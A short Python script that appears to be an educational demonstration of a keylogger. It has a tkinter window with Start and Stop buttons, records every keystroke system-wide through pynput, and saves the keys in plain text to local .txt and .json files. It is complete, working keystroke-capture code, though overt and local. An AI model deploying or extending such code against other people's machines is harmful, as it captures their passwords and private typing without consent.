import tkinter as tk
from pynput import keyboard
import json

keys = []
listener = None

def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        keys.append(str(key))

def start_logging():
    global listener
    keys.clear()
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    status_label.config(text="Logging Started")

def stop_logging():
    global listener
    if listener:
        listener.stop()
        save_keys()
        status_label.config(text="Logging Stopped")

def save_keys():
    with open("keystrokes.txt", "w") as file:
        for key in keys:
            file.write(key)

    with open("keystrokes.json", "w") as json_file:
        json.dump(keys, json_file)

root = tk.Tk()
root.title("Keystroke Logging Demo (Educational)")

tk.Label(root, text="Keystroke Logging Demonstration", font=("Arial", 14)).pack(pady=10)

tk.Button(root, text="Start Logging", command=start_logging).pack(pady=5)
tk.Button(root, text="Stop Logging", command=stop_logging).pack(pady=5)

status_label = tk.Label(root, text="Logging Stopped", fg="red")
status_label.pack(pady=10)

root.mainloop()
